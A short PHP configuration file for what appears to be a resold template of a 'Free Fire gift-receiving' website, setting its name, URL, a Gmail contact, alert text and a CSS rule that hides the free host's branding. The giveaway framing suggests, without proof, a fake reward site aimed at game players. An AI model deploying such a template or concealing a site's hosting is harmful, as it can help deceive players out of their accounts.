 <?php
$bs_nameweb = "NHANQUAVIP.COM";
$bs_main_url = "https://shopnhanthuong.com/";
//=== Không cần chỉnh phần dưới , nếu lỗi inbox thắng , thắng setup giúp hehe
$bs_anticode = "<style>img[alt='www.000webhost.com']{display:none;}</style>";
$bs_email = "shopnhanqua2021@gmail.com";
$bs_alert = "Vui lòng chọn game bạn cần nạp tiền.";
$bs_title = "Trang nhận quà Freefire lớn nhất Việt Nam";
$bs_desciption = "Trang nhận quà Freefire online lớn nhất Việt Nam!";
